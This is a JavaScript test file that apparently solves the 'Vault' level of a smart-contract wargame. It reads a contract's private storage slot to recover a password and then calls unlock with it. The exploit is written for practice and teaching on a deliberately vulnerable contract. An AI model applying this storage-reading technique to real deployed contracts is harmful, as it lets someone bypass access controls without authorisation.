const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Vault");
  const challengeAddress = await createChallenge(`0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 8-Vault", async function () {
  const challenge = await getChallenge();
  // All data is public on-chain.
  const password = await challenge.runner.provider.getStorage(await challenge.getAddress(), 1);

  tx = await challenge.unlock(password);
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
